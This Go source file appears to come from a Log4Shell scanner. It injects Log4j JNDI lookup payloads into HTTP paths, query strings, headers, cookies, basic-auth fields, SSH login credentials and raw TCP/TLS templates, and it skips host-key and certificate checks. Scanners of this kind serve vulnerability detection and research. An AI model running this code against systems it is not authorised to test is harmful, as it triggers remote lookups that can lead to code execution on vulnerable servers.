package l9l4gfuzz

import (
	"bytes"
	"context"
	"crypto/tls"
	"errors"
	"golang.org/x/crypto/ssh"
	"io"
	"net"
	"net/http"
	"net/url"
	"time"
)

func (f *fuzzer) FuzzUrl(inputUrl string) (err error) {
	parsedUrl, err := url.ParseRequestURI(inputUrl)
	if err != nil {
		parsedUrl, err = url.ParseRequestURI("tcp://" + inputUrl)
		if err != nil {
			return err
		}
	}
	if f.requestTemplate != nil {
		//TCP mode
		return f.FuzzTemplate(parsedUrl)
	}
	switch parsedUrl.Scheme {
	case "http":
		return f.FuzzHttp(parsedUrl)
	case "https":
		return f.FuzzHttp(parsedUrl)
	case "ssh":
		return f.FuzzSSH(parsedUrl)
	}
	return ErrNoFuzzerForScheme
}

func (f *fuzzer) FuzzHttp(parsedUrl *url.URL) (err error) {
	ctx, ctxCancel := context.WithTimeout(context.Background(), f.timeout)
	defer ctxCancel()
	sourceUrl := parsedUrl.String()
	if len(parsedUrl.Path) < 1 || parsedUrl.Path == "/" {
		parsedUrl.Path = "/" + f.PayloadJNDILog4J(sourceUrl, "http-url-path")
	}
	parsedUrl.RawQuery = f.PayloadJNDILog4J(sourceUrl, "http-url-query-key") + "=" + f.PayloadJNDILog4J(sourceUrl, "http-url-query-value")
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, parsedUrl.String(), nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", f.PayloadJNDILog4J(sourceUrl, "http-user-agent"))
	req.Header.Set("Cookie", f.PayloadJNDILog4J(sourceUrl, "http-cookie-key")+"="+f.PayloadJNDILog4J(sourceUrl, "http-cookie-value"))
	req.Header.Set("Cache-Control", f.PayloadJNDILog4J(sourceUrl, "http-header-cache-control"))
	req.Header.Set("X-LeakIX", f.PayloadJNDILog4J(sourceUrl, "http-header-random"))
	req.Header.Set("X-Forwarded-For", f.PayloadJNDILog4J(sourceUrl, "http-header-x-forwarded-for"))
	req.Header.Set("X-Duplicate", f.PayloadJNDILog4J(sourceUrl, "http-header-dup1"))
	req.Header.Set("X-Duplicate", f.PayloadJNDILog4J(sourceUrl, "http-header-dup2"))
	req.SetBasicAuth(f.PayloadJNDILog4J(sourceUrl, "http-auth-basic-user"), f.PayloadJNDILog4J(sourceUrl, "http-auth-basic-password"))
	resp, err := HttpClient().Do(req)
	if err != nil {
		return err
	}
	if resp != nil && resp.Body != nil {
		defer resp.Body.Close()
	}
	_, err = io.Copy(io.Discard, resp.Body)
	return err
}

func (f *fuzzer) FuzzSSH(parsedUrl *url.URL) (err error) {
	host := parsedUrl.Hostname()
	port := "22"
	if parsedUrl.Port() != "" {
		port = parsedUrl.Port()
	}
	conn, err := f.l9Helper.GetNetworkConnection("tcp", net.JoinHostPort(host, port))
	if err != nil {
		return
	}
	defer conn.Close()
	_, _, _, err = ssh.NewClientConn(conn, net.JoinHostPort(host, port), &ssh.ClientConfig{
		User: f.PayloadJNDILog4J(parsedUrl.String(), "ssh-user"),
		Auth: []ssh.AuthMethod{
			ssh.Password(f.PayloadJNDILog4J(parsedUrl.String(), "ssh-password")),
		},
		HostKeyCallback: func(_ string, _ net.Addr, key ssh.PublicKey) error {
			return nil
		},
		BannerCallback: func(message string) error {
			return nil
		},
		Timeout: f.timeout,
	})
	return err
}

func (f *fuzzer) FuzzTemplate(parsedUrl *url.URL) (err error) {
	host := parsedUrl.Hostname()
	if parsedUrl.Port() == "" {
		return errors.New("not port for generic tcp")
	}
	var buffer bytes.Buffer
	err = f.requestTemplate.Execute(&buffer, struct {
		Url    *url.URL
		Fuzzer *fuzzer
	}{
		Url:    parsedUrl,
		Fuzzer: f,
	})
	conn, err := f.l9Helper.GetNetworkConnection("tcp", net.JoinHostPort(host, parsedUrl.Port()))
	if err != nil {
		return
	}
	defer conn.Close()
	// Upgrade to TLS if scheme is https/ssl or tls
	if parsedUrl.Scheme == "https" || parsedUrl.Scheme == "ssl" || parsedUrl.Scheme == "tls" {
		err = conn.SetDeadline(time.Now().Add(f.timeout))
		if err != nil {
			return
		}
		conn = tls.Client(conn,
			// #nosec because we're a scanner
			&tls.Config{InsecureSkipVerify: true, ServerName: host},
		)
		err = conn.(*tls.Conn).Handshake()
		if err != nil {
			return
		}
	}
	err = conn.SetDeadline(time.Now().Add(f.timeout))
	if err != nil {
		return err
	}
	_, err = conn.Write(buffer.Bytes())
	return err
}
